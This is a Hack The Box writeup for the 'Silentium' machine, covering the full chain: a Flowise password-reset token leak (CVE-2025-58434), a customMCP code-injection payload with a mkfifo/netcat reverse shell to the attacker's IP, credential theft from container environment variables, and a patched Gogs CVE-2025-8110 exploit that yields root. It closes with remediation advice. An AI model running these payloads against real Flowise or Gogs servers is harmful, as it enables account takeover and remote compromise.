---
title: "HTB Silentium Writeup"
summary: "Linux writeup covering web application flaws, token handling, credential reuse, and container-adjacent privilege escalation."
date: 2026-06-06
tags:
  - htb
  - linux
  - web
  - password-reset
  - docker
  - recon
category: "hack-the-box"
difficulty: "easy"
platform: "hackthebox"
boxImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/601d72b592e6b78aee56dbc086ec7089.png"
draft: false
---
## Challenge Information

|Field|Value|
|---|---|
|Machine|Silentium|
|Difficulty|Easy|
|OS|Linux|
|Target IP|`[REDACTED_TARGET_IP]`|
|User Flag|`[REDACTED_FLAG]`|
|Root Flag|`[REDACTED_FLAG]`|

---

## 1. Reconnaissance

The target was first checked for connectivity.

```bash
ping [REDACTED_TARGET_IP]
```

The host responded successfully.

A full TCP port scan was then performed.

```bash
export IP=[REDACTED_TARGET_IP]
mkdir -p scans enum loot

sudo nmap -Pn -n -p- --min-rate 5000 $IP -oN scans/full_tcp.txt
```

Open ports:

```text
22/tcp open ssh
80/tcp open http
```

A service/version scan was run against the discovered ports.

```bash
ports=$(grep -oP '^\d+(?=/tcp\s+open)' scans/full_tcp.txt | paste -sd,)
sudo nmap -Pn -n -sCV -p "$ports" $IP -oN scans/svc_tcp.txt
```

Important result:

```text
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  nginx 1.24.0
http-title: Did not follow redirect to http://silentium.htb/
```

The web service redirected to `silentium.htb`, so the hostname was added to `/etc/hosts`.

```bash
echo "[REDACTED_TARGET_IP] silentium.htb" | sudo tee -a /etc/hosts
```

---

## 2. Virtual Host Enumeration

The main site did not immediately expose useful functionality, so virtual host fuzzing was performed.

```bash
ffuf -u http://[REDACTED_TARGET_IP]/ \
-H "Host: FUZZ.silentium.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-mc all \
-o enum/ffuf_vhosts.json
```

A valid vhost was discovered:

```text
staging.silentium.htb
```

It was added to `/etc/hosts`.

```bash
echo "[REDACTED_TARGET_IP] silentium.htb staging.silentium.htb" | sudo tee -a /etc/hosts
```

Visiting the staging host showed a Flowise instance.

```bash
curl -i http://staging.silentium.htb/
```

---

## 3. Flowise Enumeration

The Flowise version was identified as:

```text
Flowise 3.0.5
```

This version was vulnerable to `CVE-2025-58434`, an unauthenticated password-reset token disclosure vulnerability.

The vulnerable endpoint was tested against the discovered user email:

```bash
export H=http://staging.silentium.htb
EMAIL='ben@silentium.htb'

curl -s -X POST "$H/api/v1/account/forgot-password" \
-H "Content-Type: application/json" \
-d "{\"user\":{\"email\":\"$EMAIL\"}}" | tee loot/ben_forgot.json

jq . loot/ben_forgot.json
```

The response leaked sensitive account information, including a valid password reset token.

Relevant response fields:

```json
{
  "user": {
    "name": "admin",
    "email": "ben@silentium.htb",
    "tempToken": "REDACTED",
    "status": "active"
  }
}
```

The leaked `tempToken` was extracted.

```bash
RESET_AUTH=$(jq -r '.user.tempToken' loot/ben_forgot.json)
echo "$RESET_AUTH"
```

---

## 4. Flowise Account Takeover

The password was reset using the leaked token.

```bash
PASS='Silentium123!Aa2'

curl -s -i -X POST "$H/api/v1/account/reset-password" \
-H "Content-Type: application/json" \
-d "{\"user\":{\"email\":\"$EMAIL\",\"tempToken\":\"$RESET_AUTH\",\"password\":\"$PASS\"}}"
```

The server returned:

```text
HTTP/1.1 201 Created
```

This confirmed the Flowise password reset succeeded.

After logging in through the browser, authenticated cookies were captured and used to access Flowise API endpoints.

```bash
COOKIE=$(cat loot/cookie.txt)

curl -s "$H/api/v1/apikey" \
-H "Cookie: $COOKIE" \
-H "x-request-from: internal" | jq
```

The API key endpoint disclosed a Flowise API key.

The API key was redacted in the final report.

---

## 5. Flowise Custom MCP RCE

Flowise exposed the endpoint:

```text
/api/v1/node-load-method/customMCP
```

A malicious MCP payload was created to execute Node.js `child_process` code server-side.

A reverse shell payload was generated.

```bash
export H=http://staging.silentium.htb
export APIKEY='REDACTED'
export LHOST='[REDACTED_VPN_IP]'
export LPORT=4444

python3 - <<'PY' > loot/mcp_rce.json
import json, os

cmd = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {os.environ['LHOST']} {os.environ['LPORT']} >/tmp/f"

payload = {
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": f"({{x:(function(){{const cp=process.mainModule.require('child_process');cp.exec({json.dumps(cmd)});return 1;}})()}})"
  }
}

print(json.dumps(payload))
PY
```

A listener was started.

```bash
nc -lvnp 4444
```

The payload was triggered.

```bash
curl -s -i -X POST "$H/api/v1/node-load-method/customMCP" \
-H "Authorization: Bearer $APIKEY" \
-H "Content-Type: application/json" \
-d @loot/mcp_rce.json
```

A reverse shell was received.

```text
connect to [REDACTED_VPN_IP] from [REDACTED_TARGET_IP]
/ # id
uid=0(root) gid=0(root)
```

At this stage, the shell was root inside the Flowise container, not host root.

---

## 6. Container Enumeration

The container was identified as Alpine Linux.

```sh
cat /etc/os-release
```

Output:

```text
NAME="Alpine Linux"
VERSION_ID=3.22.1
```

The mount table showed that `/root/.flowise` was mounted from the host disk.

```sh
mount
```

Important mount:

```text
/dev/sda4 on /root/.flowise type ext4
```

Flowise data was located in:

```text
/root/.flowise
```

Files found:

```sh
ls -la /root/.flowise
```

Output:

```text
database.sqlite
encryption.key
uploads/
```

The container environment was then inspected.

```sh
env | sort
cat /proc/1/environ | tr '\0' '\n' | sort
```

Important environment variables:

```text
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=[REDACTED_PASSWORD]
SMTP_PASSWORD=[REDACTED_PASSWORD]
SENDER_EMAIL=ben@silentium.htb
```

The SMTP password was reused for SSH access to the host.

---

## 7. Host Foothold as ben

SSH was used from Kali to access the host as `ben`.

```bash
ssh ben@[REDACTED_TARGET_IP]
```

Password:

[REDACTED_PASSWORD]
[REDACTED_PASSWORD]
```

Successful login:

```text
Welcome to Ubuntu 24.04.4 LTS
ben@silentium:~$
```

The user flag was retrieved.

```bash
id
cat ~/[REDACTED_FLAG_PATH]
```

Output:

```text
uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
[REDACTED_HASH]
```

User flag:

```text
[REDACTED_HASH]
```

---

## 8. Internal Service Enumeration

Listening services were enumerated.

```bash
ss -lntp
ps aux | grep -Ei 'gogs|git|docker'
```

Important services:

```text
127.0.0.1:3000  Flowise
127.0.0.1:3001  Gogs
127.0.0.1:8025  MailHog
```

Gogs was running as root.

```text
root  /opt/gogs/gogs/gogs web
```

This was important because exploiting Gogs would result in root-level code execution.

The Gogs configuration file was read.

```bash
cat /opt/gogs/gogs/custom/conf/app.ini
```

Important values:

```ini
RUN_USER = root

[server]
HTTP_ADDR = 127.0.0.1
HTTP_PORT = 3001
DOMAIN = staging-v2-code.dev.silentium.htb

[database]
TYPE = sqlite3
PATH = /opt/gogs/data/gogs.db

[repository]
ROOT_PATH = /root/gogs-repositories

[auth]
DISABLE_REGISTRATION = false
ENABLE_REGISTRATION_CAPTCHA = true
```

The key findings were:

1. Gogs was bound to localhost on port `3001`.

2. Gogs was running as `root`.

3. Registration was enabled, but CAPTCHA blocked automated registration.

4. Repository storage was under `/root/gogs-repositories`.


---

## 9. Gogs Access Through SSH Tunnel

An SSH tunnel was created from Kali to access the internal Gogs service.

```bash
ssh -N -L 3001:127.0.0.1:3001 ben@[REDACTED_TARGET_IP]
```

The following host entry was added on Kali:

```bash
echo "127.0.0.1 staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts
```

Gogs was opened in the browser:

```text
http://staging-v2-code.dev.silentium.htb:3001
```

Since automated registration failed due to CAPTCHA, a user was manually registered.

Credentials used:

```text
Username: g10d
Email: g10d@silentium.htb
Password: [REDACTED_PASSWORD]
```

---

## 10. CVE-2025-8110 — Gogs RCE

The next step was exploiting `CVE-2025-8110`.

This vulnerability abuses improper symlink handling in the Gogs `PutContents` API. An authenticated user can create a repository containing a malicious symlink and then use the API to overwrite files outside the repository. Since Gogs was running as root, this resulted in root command execution.

A public PoC was cloned.

```bash
git clone https://github.com/zAbuQasem/gogs-CVE-2025-8110
cd gogs-CVE-2025-8110
```

Initial execution failed because the PoC attempted automated registration, which was blocked by CAPTCHA.

```text
Registration failed: 200
[-] Error: Registration failed
```

The PoC was patched to skip registration and use the manually created account.

```bash
cp CVE-2025-8110.py CVE-2025-8110_patched.py

python3 - <<'PY'
from pathlib import Path

p = Path("CVE-2025-8110_patched.py")
s = p.read_text()

s = s.replace('username = "zAbuQasem"', 'username = "g10d"')
s = s.replace('pass' + 'word = "[REDACTED_PASSWORD]"', 'pass' + 'word = "[REDACTED_PASSWORD]"')
s = s.replace('        register(session, args.url, username, password)\n', '        # register skipped: CAPTCHA enabled\n')

p.write_text(s)
PY
```

The first patched run failed because Git identity was not configured locally.

```text
fatal: unable to auto-detect email address
```

This was fixed on Kali.

```bash
git config --global user.email "g10d@silentium.htb"
git config --global user.name "g10d"
```

A listener was started.

```bash
nc -lvnp 4445
```

The exploit was run again.

```bash
python3 CVE-2025-8110_patched.py \
-u http://staging-v2-code.dev.silentium.htb:3001 \
-lh [REDACTED_VPN_IP] \
-lp 4445
```

The exploit successfully authenticated, generated an application token, created a repository, pushed the malicious symlink, and triggered the payload.

Relevant output:

```text
[+] Authenticated successfully
Token generation status: 200
[+] Application token: REDACTED
Repo creation status: 201
[+] Exploit sent, check your listener!
```

A root shell was received.

```text
connect to [REDACTED_VPN_IP] from [REDACTED_TARGET_IP]
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2#
```

---

## 11. Root Flag

The shell was running as root on the host.

```bash
id
whoami
cd
ls
cat [REDACTED_FLAG_PATH]
```

Output:

```text
root
gogs-repositories
[REDACTED_FLAG_PATH]
[REDACTED_HASH]
```

Root flag:

```text
[REDACTED_HASH]
```

---

## 12. Attack Chain Summary

```text
1. Nmap discovered SSH and HTTP.
2. HTTP redirected to silentium.htb.
3. Vhost fuzzing discovered staging.silentium.htb.
4. staging.silentium.htb exposed Flowise 3.0.5.
5. CVE-2025-58434 leaked password reset tempToken.
6. Password for ben@silentium.htb was reset.
7. Flowise login exposed an API key.
8. customMCP endpoint was abused for Node.js command execution.
9. Reverse shell landed as root inside the Flowise container.
10. Container environment leaked host credentials.
11. SSH access was obtained as ben using reused SMTP password.
12. Gogs was discovered on localhost:3001, running as root.
13. Gogs registration was manually completed due CAPTCHA.
14. CVE-2025-8110 PoC was patched to use existing credentials.
15. Gogs symlink/PutContents abuse resulted in host root shell.
16. [REDACTED_FLAG_PATH] was read.
```

---

## 13. Remediation Notes

### Flowise

- Upgrade Flowise to at least `3.0.6`.

- Ensure password reset tokens are never returned in API responses.

- Deliver reset tokens only through the verified email channel.

- Rotate exposed Flowise API keys and JWT secrets.

- Avoid storing reusable host credentials in container environment variables.


### Docker / Container Security

- Do not run application containers as root.

- Avoid mounting host-sensitive paths into containers unless required.

- Use least-privilege Docker capabilities.

- Separate application credentials from host user credentials.


### Gogs

- Upgrade or mitigate affected Gogs versions vulnerable to CVE-2025-8110.

- Do not run Gogs as root.

- Disable open registration unless required.

- Enforce least privilege on repository storage paths.

- Monitor for suspicious symlink commits and unexpected writes outside repositories.


---

## 14. Flags

|Type|Flag|
|---|---|
|User|`[REDACTED_HASH]`|
|Root|`[REDACTED_HASH]`|
